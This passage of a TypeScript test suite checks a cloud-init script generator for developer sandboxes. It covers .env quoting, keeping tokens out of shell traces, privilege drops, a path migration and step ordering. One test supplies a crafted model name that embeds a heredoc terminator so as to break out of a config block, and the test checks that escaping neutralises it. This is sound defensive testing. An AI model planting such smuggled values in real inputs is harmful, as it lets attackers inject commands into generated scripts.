  assert.equal(body.split("\n").length, 2);
  // Every line of the file is a well-formed assignment.
  for (const l of body.split("\n")) {
    assert.match(l, /^[A-Za-z_][A-Za-z0-9_]*=/);
  }
  assert.ok(body.includes("AFTER=still-here"));

  // What actually matters: a reader gets the credential back byte-for-byte and
  // it is still valid JSON. `export $(cat .env | xargs)` cannot do this for any
  // value with spaces â€” the supported way to load it is `set -a && . ./.env`.
  const got = readDotenvValue(body, "GOOGLE_CREDENTIALS");
  assert.equal(got, serviceAccount);
  const parsed = JSON.parse(got!) as {
    client_email: string;
    private_key: string;
  };
  assert.equal(parsed.client_email, "svc@example.iam.gserviceaccount.com");
  // The PEM survives with its newlines, not a literal `\n` soup.
  assert.equal(parsed.private_key.split("\n").length, 5);

  assert.equal(readDotenvValue(body, "AFTER"), "still-here");
});

test("a repo .env quotes values with spaces, quotes or `#`", () => {
  const script = renderCloudInit(
    baseSpec({
      repos: [
        {
          name: "app",
          repoUrl: "https://github.com/acme/app.git",
          envVars: {
            SPACED: "hello world",
            HASHED: "abc#def",
            QUOTED: 'say "hi"',
            APOSTROPHE: "it's here",
            PLAIN: "postgres://u:p@h/db",
          },
        },
      ],
    }),
  );
  const body = dotenvBody(script);
  // Quoted so the shell and dotenv both keep the whole valueâ€¦
  assert.ok(body.includes(`SPACED='hello world'`));
  assert.ok(body.includes(`HASHED='abc#def'`));
  // â€¦and a value containing a single quote falls back to double quotes, since
  // there is no way to escape `'` inside single quotes.
  assert.ok(body.includes(`APOSTROPHE="it's here"`));
  // Nothing special â€” left bare so a normal .env still reads like one.
  assert.ok(body.includes("PLAIN=postgres://u:p@h/db"));

  // Round-trip every one of them through a reader.
  assert.equal(readDotenvValue(body, "SPACED"), "hello world");
  assert.equal(readDotenvValue(body, "HASHED"), "abc#def");
  assert.equal(readDotenvValue(body, "QUOTED"), 'say "hi"');
  assert.equal(readDotenvValue(body, "APOSTROPHE"), "it's here");
  assert.equal(readDotenvValue(body, "PLAIN"), "postgres://u:p@h/db");
});

test("installOpenCode installs the CLI and writes config for both users", () => {
  const script = renderCloudInit(
    baseSpec({
      installOpenCode: true,
      openCodeModel: "anthropic/claude-sonnet-4-5",
    }),
  );
  assert.ok(script.includes("npm install -g opencode-ai"));
  assert.ok(script.includes('"model": "anthropic/claude-sonnet-4-5"'));
  assert.ok(script.includes('"permission"'));
  assert.ok(script.includes(".config/opencode/opencode.json"));
  assert.ok(script.includes('chmod 600 "$h/.config/opencode/opencode.json"'));
});

test("no openCodeModel â†’ config has permissions but no model pin", () => {
  const script = renderCloudInit(baseSpec({ installOpenCode: true }));
  assert.ok(script.includes('"permission"'));
  assert.ok(!script.includes('"model"'));
});

test("installOpenCode off â†’ no opencode section at all", () => {
  const script = renderCloudInit(baseSpec());
  assert.ok(!script.includes("opencode"));
});

test("installOpenCode alone still installs Node (npm needed)", () => {
  const script = renderCloudInit(
    baseSpec({
      installNode: false,
      installClaudeCode: false,
      installAgentBrowser: false,
      installOpenCode: true,
    }),
  );
  assert.ok(script.includes("installing Node.js 22"));
});

test("git token auth is configured with the shell trace off", () => {
  const script = renderCloudInit(
    baseSpec({ envVars: { GITHUB_TOKEN: "ghp_secret" } }),
  );
  const off = script.lastIndexOf("set +x", script.indexOf("x-access-token"));
  const on = script.indexOf("set -x", script.indexOf("x-access-token"));
  assert.ok(off >= 0, "the git auth block must disable the trace");
  assert.ok(on > off, "the trace must be restored after the git auth block");
  // The clone must run traced again â€” it is the step people debug.
  assert.ok(on < script.indexOf("git clone"));
});

test("the gitlab identity lookup hides its PRIVATE-TOKEN header", () => {
  const script = renderCloudInit(
    baseSpec({
      repos: [{ name: "app", repoUrl: "https://gitlab.com/acme/app.git" }],
      envVars: { GITLAB_TOKEN: "glpat_secret" },
    }),
  );
  const lines = script.split("\n");
  const curl = lines.findIndex(
    (l) => l.includes("PRIVATE-TOKEN") && l.includes("curl"),
  );
  assert.ok(curl > 0);
  // The line right before the curl disables the trace, the one right after
  // restores it â€” no traced command ever carries the header.
  assert.equal(lines[curl - 1].trim(), "set +x");
  assert.equal(lines[curl + 1].trim(), "set -x");
});

test("token values never reach a traced command line", () => {
  const script = renderCloudInit(
    baseSpec({ envVars: { GITHUB_TOKEN: "ghp_secret" } }),
  );
  // The literal only belongs in the quoted env heredoc, whose body bash never
  // expands into the trace â€” every other use must go through $GITHUB_TOKEN.
  const body = script
    .split("<<'NEXUX_ENV_EOF'\n")[1]
    .split("\nNEXUX_ENV_EOF")[0];
  assert.ok(body.includes("ghp_secret"));
  const occurrences = script.split("ghp_secret").length - 1;
  assert.equal(occurrences, 1, "the token must appear only in the env heredoc");
});

test("corepack activates pnpm and yarn right after the node install", () => {
  const script = renderCloudInit(baseSpec());
  const node = script.indexOf("installing Node.js 22");
  const corepack = script.indexOf("enabling corepack (pnpm, yarn)");
  assert.ok(node >= 0 && corepack >= 0);
  assert.ok(node < corepack, "corepack needs node on the box first");
  assert.ok(script.includes("corepack prepare pnpm@latest --activate"));
  assert.ok(script.includes("corepack prepare yarn@stable --activate"));
});

test("corepack shims land before any repo install could call pnpm", () => {
  const script = renderCloudInit(baseSpec());
  const corepack = script.indexOf("enabling corepack (pnpm, yarn)");
  const clone = script.indexOf("git clone");
  assert.ok(corepack >= 0 && clone >= 0);
  assert.ok(corepack < clone, "pnpm must exist before repo install runs");
});

test("no node on the box â†’ no corepack section", () => {
  const script = renderCloudInit(
    baseSpec({
      installNode: false,
      installClaudeCode: false,
      installAgentBrowser: false,
      installOpenCode: false,
    }),
  );
  assert.ok(!script.includes("enabling corepack"));
});

test("sentinel injection via openCodeModel is neutralized by JSON escaping", () => {
  // JSON.stringify turns the newline into \n inside a quoted string, so the
  // sentinel can never sit alone on a line and terminate the heredoc early.
  const script = renderCloudInit(
    baseSpec({
      installOpenCode: true,
      openCodeModel: "x\nNEXUX_OPENCODE_EOF\ny",
    }),
  );
  const body = script
    .split("<<'NEXUX_OPENCODE_EOF'\n")[1]
    .split("\nNEXUX_OPENCODE_EOF")[0];
  assert.ok(body.includes('"model": "x\\nNEXUX_OPENCODE_EOF\\ny"'));
  assert.ok(JSON.parse(body), "config heredoc body must stay valid JSON");
});

test("renderMainTf defaults to the civo module", () => {
  const tf = renderMainTf();
  assert.ok(tf.includes('provider "civo"'));
  assert.ok(tf.includes("civo_instance"));
  assert.ok(!tf.includes("aws_instance"));
});

test("renderMainTf renders the aws module", () => {
  const tf = renderMainTf("aws");
  assert.ok(tf.includes('provider "aws"'));
  assert.ok(tf.includes("aws_instance"));
  assert.ok(tf.includes("aws_security_group"));
  assert.ok(tf.includes("aws_key_pair"));
  assert.ok(tf.includes('data "aws_ami" "sandbox"'));
  // Same outputs as civo â€” the provisioner reads them provider-agnostically.
  assert.ok(tf.includes('output "instance_id"'));
  assert.ok(tf.includes('output "public_ip"'));
  assert.ok(!tf.includes("civo_instance"));
});

test("aws module maps the shared disk_image identifiers to AMIs", () => {
  const tf = renderMainTf("aws");
  for (const image of ["ubuntu-jammy", "ubuntu-focal", "debian-11"]) {
    assert.ok(tf.includes(`"${image}"`), `missing image mapping: ${image}`);
  }
});

test("mounted repo (mountPath, no repoUrl) skips clone but keeps install", () => {
  const script = renderCloudInit(
    baseSpec({
      repos: [
        {
          name: "my-idea",
          repoUrl: null,
          mountPath: "/Users/me/Projects/my-idea",
          installCommand: "pnpm install",
        },
      ],
    }),
  );
  assert.ok(script.includes("using mounted workspace for my-idea"));
  assert.ok(!script.includes("git clone"));
  assert.ok(script.includes("pnpm install"));
  // Section dir matches where local.ts bind-mounts the folder.
  assert.ok(script.includes("/opt/nexus/my-idea"));
});

test("repos with neither url nor mountPath are skipped entirely", () => {
  const script = renderCloudInit(
    baseSpec({ repos: [{ name: "ghost", repoUrl: null }] }),
  );
  assert.ok(!script.includes("ghost"));
});

// --- Privilege drop ---
//
// Bootstrap is root (cloud-init has no choice), but anything writing *inside* a
// checkout must run as the agent user: the dev servers, the agent and the
// terminal all run as `nexus`, and a root-owned node_modules/.next/lib makes
// them fail with EACCES later. The trailing `chown` cannot cover it â€” a
// launcher writing after it re-creates root-owned paths behind its back.

test("the clone runs as the agent user, so .git is not root-owned", () => {
  const script = renderCloudInit(baseSpec());
  assert.ok(script.includes("runuser -u nexus -- git clone"));
});

test("install and build run as the agent user", () => {
  const script = renderCloudInit(
    baseSpec({
      repos: [
        {
          name: "app",
          repoUrl: "https://github.com/acme/app.git",
          installCommand: "pnpm install",
          buildCommand: "pnpm build",
        },
      ],
    }),
  );
  for (const command of ["pnpm install", "pnpm build"]) {
    // The command reaches runuser through a quoted `bash -lc`, so assert on the
    // pairing rather than on exact quoting.
    const line = script
      .split("\n")
      .find((l) => l.includes(command) && l.includes("runuser"));
    assert.ok(line, `${command} should run via runuser`);
    assert.ok(line!.includes("runuser -u nexus --"));
  }
});

test("an inferred lockfile install also drops privileges", () => {
  const script = renderCloudInit(baseSpec());
  // corepack/bun install globally and stay root; only the install drops.
  //
  // Asserted by running the line rather than matching its text: since spec 24
  // the install is an argument to `nexus_step_run`, so the `runuser` command
  // is single-quoted *inside* an already single-quoted string and the literal
  // form is unreadable. What matters is what bash hands to runuser after both
  // layers unwrap, which is what this checks.
  for (const [manager, lockfile] of [
    ["pnpm", "pnpm-lock.yaml"],
    ["npm", null],
  ] as const) {
    // `&& npm install` — anchored, because "npm install" is a substring of
    // "pnpm install" and an unanchored find returns the pnpm line for both.
    const line = script
      .split("\n")
      .find((l) => l.includes("nexus_step_run") && l.includes(`&& ${manager} install`));
    assert.ok(line, `no recorded step for the ${manager} install`);
    const got = runGeneratedLine(line!);
    assert.equal(
      got,
      `RUNUSER-GOT:bash -lc cd '/opt/nexus/app' && ${manager} install`,
      `the ${manager} install (${lockfile ?? "no lockfile"}) does not drop privileges intact`,
    );
  }
  assert.ok(script.includes("corepack enable"));
});

test("a stack launcher runs as the agent user", () => {
  // This is what left emulator-data/ and functions/node_modules root-owned:
  // launchers run *after* the trailing chown, so it never covered them.
  const script = renderCloudInit(
    baseSpec({
      stackLaunchers: [
        {
          name: "functions",
          repoDir: "cloudfunctions",
          workdir: "",
          startCommand: "make docker-up",
        },
      ],
    }),
  );
  const line = script
    .split("\n")
    .find((l) => l.includes("make docker-up") && l.includes("runuser"));
  assert.ok(line, "the launcher should run via runuser");
  assert.ok(line!.includes("runuser -u nexus --"));
});

test("the repo .env is readable by the agent that has to load it", () => {
  // Written by root via heredoc (keeps secrets out of argv) at 0600, which
  // without the chown would leave the agent unable to read its own .env.
  const script = renderCloudInit(
    baseSpec({
      repos: [
        {
          name: "app",
          repoUrl: "https://github.com/acme/app.git",
          envVars: { API_KEY: "secret" },
        },
      ],
    }),
  );
  assert.ok(script.includes("chmod 600 '/opt/nexus/app/.env'"));
  assert.ok(script.includes("chown nexus:nexus '/opt/nexus/app/.env'"));
});

test("a bind-mounted checkout is handed to the agent user", () => {
  // It arrives with the host's uid, and the agent still has to install into it.
  const script = renderCloudInit(
    baseSpec({
      repos: [
        { name: "my-idea", repoUrl: null, mountPath: "/Users/me/my-idea" },
      ],
    }),
  );
  assert.ok(script.includes("chown -R nexus:nexus '/opt/nexus/my-idea'"));
});

test("mcpServers land in ~/.claude.json for both homes", () => {
  const script = renderCloudInit(
    baseSpec({
      mcpServers: {
        context7: { command: "npx", args: ["-y", "@upstash/context7-mcp"] },
      },
    }),
  );
  assert.ok(script.includes('"mcpServers"'));
  assert.ok(script.includes("@upstash/context7-mcp"));
  assert.ok(script.includes("configuring 1 MCP server(s)"));
  assert.ok(script.includes('"hasCompletedOnboarding": true'));
});

test("no mcpServers â†’ onboarding-only .claude.json, no mcp mention", () => {
  const script = renderCloudInit(baseSpec());
  assert.ok(script.includes('"hasCompletedOnboarding": true'));
  assert.ok(!script.includes("mcpServers"));
});

test("with OpenCode, the project's MCP servers land in opencode.json too", () => {
  const script = renderCloudInit(
    baseSpec({
      installOpenCode: true,
      mcpServers: {
        context7: { command: "npx", args: ["-y", "@upstash/context7-mcp"] },
        broken: {},
      },
    }),
  );
  const opencode = script.slice(script.indexOf("installing OpenCode"));
  assert.ok(opencode.includes('"mcp"'));
  assert.ok(opencode.includes('"type": "local"'));
  assert.ok(opencode.includes("configuring 1 MCP server(s) for OpenCode"));
  assert.ok(opencode.includes("not configured: broken"));
});

test("OpenCode without MCP servers gets no mcp key", () => {
  const script = renderCloudInit(baseSpec({ installOpenCode: true }));
  const opencode = script.slice(script.indexOf("installing OpenCode"));
  assert.ok(!opencode.includes('"mcp"'));
});

test("bootstrap installs both gh and glab CLIs", () => {
  const script = renderCloudInit(baseSpec());
  assert.ok(script.includes("installing GitHub CLI"));
  assert.ok(script.includes("installing GitLab CLI"));
  assert.ok(script.includes("gitlab-org/cli/-/releases"));
  // Fallback pin so a flaky API lookup can't skip the install.
  assert.ok(script.includes("GLAB_TAG:-v"));
});

test("sourcing the env file is never traced", () => {
  // xtrace echoes every `export` the file contains, so sourcing it with the
  // trace on writes every project secret verbatim into
  // /var/log/nexus-bootstrap.log — which the UI serves. Observed leaking a
  // GitLab token, a Claude OAuth token and a project's API secret.
  const script = renderCloudInit(
    baseSpec({ envVars: { GITLAB_TOKEN: "glpat_secret", SOME_API_SECRET: "s3cr3t" } }),
  );

  // Walk the script tracking xtrace, rather than searching backwards from each
  // hit: `set -x` and `set +x` appear many times and only their order matters.
  let tracing = false;
  let checked = 0;
  for (const raw of script.split("\n")) {
    const line = raw.trim();
    if (line === "set -x") tracing = true;
    else if (line === "set +x") tracing = false;

    // Only lines that *execute* the source. `echo '… . /etc/profile.d/…' >> rc`
    // writes that text into a bashrc; it runs nothing and leaks nothing.
    if (!/^(\.|\[ -f )[^|]*profile\.d\/nexus-env\.sh/.test(line)) continue;
    if (!/(^|&&\s*)\.\s/.test(line)) continue;
    checked++;
    assert.ok(!tracing, `env file sourced with the trace on: ${line}`);
  }
  assert.ok(checked >= 2, `expected to find the source lines, saw ${checked}`);
});

test("GITLAB_HOST extends git token auth to a self-hosted instance", () => {
  const script = renderCloudInit(baseSpec());
  // The guard chain is emitted whenever repos exist; host is resolved at
  // runtime from the exported env, scheme-tolerant.
  assert.ok(script.includes('GL_HOST="${GITLAB_HOST#https://}"'));
  assert.ok(script.includes('nexus_git_auth "$GL_HOST" "oauth2:${GITLAB_TOKEN}"'));
});

test("token auth covers the ssh remote forms, not just https", () => {
  // A sandbox has no ssh key for any git host, so `git clone git@host:x.git`
  // — the form a "clone with SSH" button hands you, and the one submodules
  // carry — fails with "Permission denied (publickey)" unless it is rewritten.
  const script = renderCloudInit(baseSpec());
  const helper = script.slice(
    script.indexOf("nexus_git_auth() {"),
    script.indexOf("unset -f nexus_git_auth"),
  );
  assert.ok(helper.includes('.insteadOf "https://$1/"'));
  assert.ok(helper.includes('.insteadOf "git@$1:"'));
  assert.ok(helper.includes('.insteadOf "ssh://git@$1/"'));
  // The https mapping resets the list; the ssh ones extend it. Without
  // --replace-all a re-bootstrap would append a duplicate every time.
  assert.ok(helper.includes("--replace-all"));
  assert.equal(helper.split("--add").length - 1, 2);
});

test("every token provider gets the same three remote forms", () => {
  const script = renderCloudInit(baseSpec());
  // One call site per host: a provider wired up by hand would be the one that
  // silently kept https-only auth.
  for (const call of [
    'nexus_git_auth github.com "x-access-token:${GITHUB_TOKEN}"',
    'nexus_git_auth gitlab.com "oauth2:${GITLAB_TOKEN}"',
    'nexus_git_auth bitbucket.org "x-token-auth:${BITBUCKET_TOKEN}"',
  ]) {
    assert.ok(script.includes(call), `missing: ${call}`);
  }
  // And no host still configures insteadOf on its own.
  const authBlock = script.slice(
    script.indexOf("nexus_git_auth() {"),
    script.indexOf("unset -f nexus_git_auth"),
  );
  assert.equal(
    script.split("insteadOf").length - 1,
    authBlock.split("insteadOf").length - 1,
  );
});

test("git identity resolves from the token owner, github first for github repos", () => {
  const script = renderCloudInit(baseSpec());
  const idx = script.indexOf("resolving git identity from the token owner");
  assert.ok(idx >= 0);
  // Fallback bot identity is configured earlier; owner resolution overrides.
  assert.ok(script.indexOf('user.name "Nexus Agent"') < idx);
  // Base spec's repo is github â†’ the github block comes before the gitlab one.
  const gh = script.indexOf("gh api user -q .login");
  const gl = script.indexOf("/api/v4/user");
  assert.ok(gh >= 0 && gl >= 0 && gh < gl);
  assert.ok(script.includes("@users.noreply.github.com"));
  // Identity resolves before any clone happens.
  assert.ok(idx < script.indexOf("git clone"));
});

test("gitlab-primary repos ask gitlab for the identity first", () => {
  const script = renderCloudInit(
    baseSpec({
      repos: [{ name: "app", repoUrl: "https://gitlab.com/acme/app.git" }],
    }),
  );
  const gh = script.indexOf("gh api user -q .login");
  const gl = script.indexOf("/api/v4/user");
  assert.ok(gh >= 0 && gl >= 0 && gl < gh);
  assert.ok(script.includes("commit_email"));
});

test("claude settings disable the commit attribution footer", () => {
  // With and without a token: includeCoAuthoredBy must always be off.
  const cases: Record<string, string>[] = [{}, { CLAUDE_CODE_OAUTH_TOKEN: "tok" }];
  for (const envVars of cases) {
    const script = renderCloudInit(baseSpec({ envVars }));
    assert.ok(script.includes('"includeCoAuthoredBy": false'));
  }
});

// --- /opt/nexux -> /opt/nexus migration ---
//
// Sandboxes provisioned before the rename hold their checkouts at /opt/nexux,
// owned by a `nexux` user. Re-bootstrapping such a box has to move that tree
// without losing it, and stay idempotent â€” cloud-init reruns, and the second
// pass must not turn the compat symlink into a link to itself.
//
// These run the rendered block for real rather than asserting on its text: the
// failure that actually matters (a self-referential symlink, a clobbered
// checkout) is invisible to a substring check.

/**
 * Extract the migration block and rebase its absolute paths onto `root`, so it
 * can run unprivileged in a temp dir. Keeps the assertions bound to the shipped
 * script â€” editing template.ts without updating it here fails the extraction.
 */
function migrationBlock(root: string): string {
  const script = renderCloudInit(baseSpec());
  const start = script.indexOf("if [ -d /opt/nexux ]");
  const endMarker = "[ -e /opt/nexux ] || ln -s /opt/nexus /opt/nexux";
  const end = script.indexOf(endMarker);
  assert.ok(start >= 0, "migration guard not found in the rendered script");
  assert.ok(end > start, "compat symlink line not found after the guard");
  return script
    .slice(start, end + endMarker.length)
    .replace(/\/opt\/nexux/g, `${root}/nexux`)
    .replace(/\/opt\/nexus/g, `${root}/nexus`);
}

/**
 * Deliberately NOT `set -e`: cloud-init runs this script without it, and the
 * distinction is load-bearing. With `set -e` a redundant second `mv` aborts the
 * run; without it the mv succeeds into the existing directory and silently eats
 * the compat symlink. Testing under `set -e` would mask exactly that bug.
 */
function runMigration(root: string): void {
  execFileSync("bash", ["-c", migrationBlock(root)], { stdio: "pipe" });
}

function tmpRoot(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), "nexux-migrate-"));
}

test("a legacy checkout survives the move and stays reachable by the old path", realBash, () => {
  const root = tmpRoot();
  fs.mkdirSync(path.join(root, "nexux", "myapp"), { recursive: true });
  fs.writeFileSync(path.join(root, "nexux", "myapp", "file.txt"), "hi");

  runMigration(root);

  // The checkout moved rather than being recreated empty...
  assert.equal(fs.readFileSync(path.join(root, "nexus", "myapp", "file.txt"), "utf8"), "hi");
  // ...and a stale /opt/nexux path (a PID file, a VS Code window) still resolves.
  assert.ok(fs.lstatSync(path.join(root, "nexux")).isSymbolicLink());
  assert.equal(fs.readFileSync(path.join(root, "nexux", "myapp", "file.txt"), "utf8"), "hi");
});

test("a fresh box gets the root plus the compat symlink", realBash, () => {
  const root = tmpRoot();
  runMigration(root);
  assert.ok(fs.statSync(path.join(root, "nexus")).isDirectory());
  assert.ok(fs.lstatSync(path.join(root, "nexux")).isSymbolicLink());
});

test("re-running never points the compat symlink at itself", realBash, () => {
  // cloud-init reruns, and `mv` on an already-migrated box would move the
  // symlink onto its own target â€” every /opt/nexux path then ELOOPs.
  const root = tmpRoot();
  fs.mkdirSync(path.join(root, "nexux", "myapp"), { recursive: true });
  runMigration(root);
  runMigration(root);
  runMigration(root);

  assert.equal(fs.readlinkSync(path.join(root, "nexux")), `${root}/nexus`);
  assert.ok(fs.statSync(path.join(root, "nexux", "myapp")).isDirectory());
  // A redundant second `mv` succeeds *into* the existing directory, burying the
  // compat symlink at /opt/nexus/nexux. readlink still reads correctly at that
  // point, so the stray entry is the only thing that catches it.
  assert.deepEqual(fs.readdirSync(path.join(root, "nexus")), ["myapp"]);
});

test("an ambiguous box keeps both trees rather than clobbering either", realBash, () => {
  // Both names as real directories means something unmodelled happened; the
  // bootstrap must not pick a winner and delete the other one's checkouts.
  const root = tmpRoot();
  fs.mkdirSync(path.join(root, "nexux", "old"), { recursive: true });
  fs.mkdirSync(path.join(root, "nexus", "new"), { recursive: true });

  runMigration(root);

  assert.ok(fs.statSync(path.join(root, "nexux", "old")).isDirectory());
  assert.ok(fs.statSync(path.join(root, "nexus", "new")).isDirectory());
});

test("agent user and ssh keys come before the apt installs", () => {
  // apt takes minutes on a small instance; SSH access (the agent user plus
  // its authorized keys) must be ready seconds after boot, not after apt —
  // "instance ready" used to be followed by minutes of publickey denials.
  const script = renderCloudInit(baseSpec({ sshPublicKey: "ssh-ed25519 AAAA test" }));
  const user = script.indexOf("creating agent user");
  const keys = script.indexOf("authorizing SSH keys");
  // The installs run through the lock-aware wrapper, not apt-get directly.
  const apt = script.indexOf("nexus_apt update");
  assert.ok(user > -1 && keys > -1 && apt > -1, "expected markers missing");
  assert.ok(user < apt, "agent user is created after apt");
  assert.ok(keys < apt, "ssh keys are authorized after apt");
});

// --- fatal bootstrap steps ---------------------------------------------------
// A sandbox whose main checkout never cloned provisions "successfully" and then
// fails every task with a bare `cd: /opt/nexus/<repo>: No such file or
// directory`, an hour after the clone warning scrolled out of the log. The main
// repo's clone is therefore fatal, and a fatal step withholds the completion
// marker the host polls.

test("the main repo's clone failure is fatal, a secondary repo's is not", () => {
  const script = renderCloudInit(
    baseSpec({
      repos: [
        { name: "api", repoUrl: "https://git.example.com/a/api.git", isMain: true },
        { name: "docs", repoUrl: "https://git.example.com/a/docs.git" },
      ],
    }),
  );
  assert.match(script, /nexus_bootstrap_fatal "clone failed for api/);
  assert.match(script, /WARN: clone failed for docs/);
  assert.ok(!/nexus_bootstrap_fatal "clone failed for docs/.test(script));
});

test("the fatal message names the directory every task cds into", () => {
  const script = renderCloudInit(
    baseSpec({
      repos: [
        { name: "acme-api", repoUrl: "https://git.example.com/c/api.git", isMain: true },
      ],
    }),
  );
  assert.match(script, /every task runs in \/opt\/nexus\/acme-api/);
});

test("with no repo marked main nothing is fatal", () => {
  // A cloud sandbox drops URL-less repos, so the real main repo can be absent
  // from the spec entirely. Guarding the next repo instead would abort on a
  // checkout no task ever uses.
  const script = renderCloudInit(baseSpec());
  assert.ok(!script.includes("nexus_bootstrap_fatal \"clone failed"));
  assert.match(script, /WARN: clone failed for app/);
});

test("a missing mount is fatal only for the main repo", () => {
  const script = renderCloudInit(
    baseSpec({
      provider: "local",
      repos: [
        { name: "api", repoUrl: null, mountPath: "/host/api", isMain: true },
        { name: "docs", repoUrl: null, mountPath: "/host/docs" },
      ],
    }),
  );
  assert.match(script, /nexus_bootstrap_fatal "mount missing for api/);
  assert.match(script, /WARN: mount missing for docs/);
});

test("the completion marker is withheld while the failure marker exists", () => {
  const script = renderCloudInit(baseSpec());
  const tail = script.slice(script.indexOf("bootstrap FAILED") - 200);
  assert.match(tail, /if \[ -f \/opt\/nexus\/\.bootstrap-failed \]/);
  assert.match(tail, /touch \/opt\/nexus\/\.bootstrap-complete/);
  // The touch must sit in the else branch, not run unconditionally before it.
  assert.ok(
    tail.indexOf("bootstrap FAILED") < tail.indexOf(".bootstrap-complete"),
    "the failure branch precedes the completion marker",
  );
});

test("the fatal helper records a reason and keeps the run going", (t) => {
  if (realBash.skip) return t.skip(realBash.skip);
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "nexux-fatal-"));
  try {
    // The helper as generated, with the sandbox root pointed at a temp dir.
    const script = `
set -ux
nexus_bootstrap_fatal() {
  mkdir -p ${dir}
  echo "$1" >> ${dir}/.bootstrap-failed
  echo "[nexux] FATAL: $1"
}
nexus_bootstrap_fatal "clone failed for api"
echo "still running"
nexus_bootstrap_fatal "second reason"
if [ -f ${dir}/.bootstrap-failed ]; then
  echo "SUPPRESSED"
else
  touch ${dir}/.bootstrap-complete
fi
`;
    const out = execFileSync("bash", ["-c", script], { encoding: "utf8" });
    assert.match(out, /still running/, "a fatal step does not abort the run");
    assert.match(out, /SUPPRESSED/);
    assert.ok(!fs.existsSync(`${dir}/.bootstrap-complete`));
    const reasons = fs.readFileSync(`${dir}/.bootstrap-failed`, "utf8");
    assert.match(reasons, /clone failed for api/);
    assert.match(reasons, /second reason/, "every reason is kept, not just the first");
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// --- chromium linking --------------------------------------------------------
// agent-browser only looks in its own cache and system Chrome locations, so the
// Playwright build is exposed as /usr/local/bin/google-chrome. The glob that
// finds it was pinned to chrome-linux/ while Playwright had renamed the
// directory to chrome-linux64/ — the install still exited 0, so nothing warned
// about the install itself and agents just reported no browser.

test("the chrome glob matches both playwright directory layouts", (t) => {
  if (realBash.skip) return t.skip(realBash.skip);
  const script = renderCloudInit(baseSpec({ installAgentBrowser: true }));
  const glob = script.match(/CHROME_BIN=\$\(ls -d (\S+) 2>\/dev\/null/)?.[1];
  assert.ok(glob, "the bootstrap globs for a chrome binary");

  const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexux-chrome-"));
  try {
    for (const layout of ["chrome-linux", "chrome-linux64"]) {
      const dir = path.join(root, "chromium-1234", layout);
      fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(path.join(dir, "chrome"), "");
      const found = execFileSync(
        "bash",
        ["-c", `ls -d ${glob.replace("/opt/ms-playwright", root)} 2>/dev/null | head -1`],
        { encoding: "utf8" },
      ).trim();
      assert.equal(found, path.join(dir, "chrome"), `${layout} is matched`);
      fs.rmSync(path.join(root, "chromium-1234"), { recursive: true, force: true });
    }
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("a chromium that cannot be found names what was there instead", () => {
  const script = renderCloudInit(baseSpec({ installAgentBrowser: true }));
  assert.match(script, /no chromium binary found to link \(under \/opt\/ms-playwright:/);
});

// --- setup script ordering ---------------------------------------------------
// A setup script installs what the repos are about to need (Go, k3d, helm). It
// used to run last, so `go mod download` and `make build` had already failed
// with "command not found" on a box that ended up holding every tool.

function orderOf(script: string, ...markers: string[]): number[] {
  return markers.map((m) => {
    const at = script.indexOf(m);
    assert.ok(at >= 0, `"${m}" is in the script`);
    return at;
  });
}

test("the setup script runs before the repos install and build", () => {
  const script = renderCloudInit(
    baseSpec({
      setupScript: "curl -fsSL https://go.dev/dl/go.tgz -o /tmp/go.tgz",
      repos: [
        {
          name: "api",
          repoUrl: "https://git.example.com/a/api.git",
          installCommand: "go mod download",
        },
      ],
    }),
  );
  const [setup, install] = orderOf(
    script,
    "running custom setup script",
    "go mod download",
  );
  assert.ok(setup < install, "setup precedes the repo install");
});

test("stack launchers run after both the checkouts and the setup script", () => {
  const script = renderCloudInit(
    baseSpec({
      setupScript: "install-k3d",
      stackLaunchers: [
        {
          name: "k3d-acme",
          repoDir: "charts",
          workdir: "",
          startCommand: "make k3d-up",
        },
      ],
    }),
  );
  const [setup, clone, launcher] = orderOf(
    script,
    "running custom setup script",
    "cloning app",
    "stack launcher: k3d-acme",
  );
  assert.ok(setup < clone, "setup precedes the clones");
  assert.ok(clone < launcher, "launchers still come after the checkouts");
});

test("no setup script leaves the rest of the order untouched", () => {
  const script = renderCloudInit(baseSpec());
  assert.ok(!script.includes("running custom setup script"));
  const [clone, marker] = orderOf(script, "cloning app", ".bootstrap-complete");
  assert.ok(clone < marker);
});

// --- claude model in the sandbox's own settings -------------------------------
// A delegated task passes `--model` per invocation, so it was always right. An
// interactive `claude` in the in-app terminal reads settings.json instead, so
// picking Opus in Sandbox settings held for tasks and silently not for a
// terminal on the same box.

function claudeSettings(script: string): Record<string, unknown> {
  const open = script.indexOf("<<'NEXUX_CLAUDE_EOF'");
  assert.ok(open >= 0, "a claude settings heredoc was emitted");
  const start = script.indexOf("\n", open) + 1;
  const end = script.indexOf("\nNEXUX_CLAUDE_EOF", start);
  return JSON.parse(script.slice(start, end));
}

test("the configured model is written into the sandbox settings", () => {
  const s = claudeSettings(
    renderCloudInit(baseSpec({ installClaudeCode: true, claudeModel: "opus" })),
  );
  assert.equal(s.model, "opus");
});

test("no model configured leaves the key out, not empty", () => {
  // An empty string is not "the default" to Claude Code — it is a model name
  // that does not exist.
  for (const claudeModel of [null, undefined, "  "]) {
    const s = claudeSettings(
      renderCloudInit(baseSpec({ installClaudeCode: true, claudeModel })),
    );
    assert.ok(!("model" in s), `${JSON.stringify(claudeModel)} omits the key`);
  }
});

test("the model does not displace the attribution or token settings", () => {
  const s = claudeSettings(
    renderCloudInit(
      baseSpec({
        installClaudeCode: true,
        claudeModel: "opus",
        envVars: { CLAUDE_CODE_OAUTH_TOKEN: "tok-123" },
      }),
    ),
  );
  assert.equal(s.model, "opus");
  assert.equal(s.includeCoAuthoredBy, false);
  assert.deepEqual(s.env, { CLAUDE_CODE_OAUTH_TOKEN: "tok-123" });
});

test("a repo with a run command and a port is probed after everything else", () => {
  // Spec 24 piece 2: the probe has to run against the same environment the
  // user's own Start will, so it lands after clone/install/build, after the
  // launchers, and after the stack services came up.
  const script = renderCloudInit(
    baseSpec({
      repos: [
        {
          name: "app",
          repoUrl: "https://github.com/acme/app.git",
          runCommand: "pnpm dev",
          runPort: 3000,
        },
      ],
    }),
  );
  assert.ok(script.includes("nexus_boot_probe 'boot:app' 'app'"));
  const [install, probe] = orderOf(script, "install:app", "nexus_boot_probe");
  assert.ok(install < probe, "the boot probe runs before the install");
});

test("a repo without a port is not probed", () => {
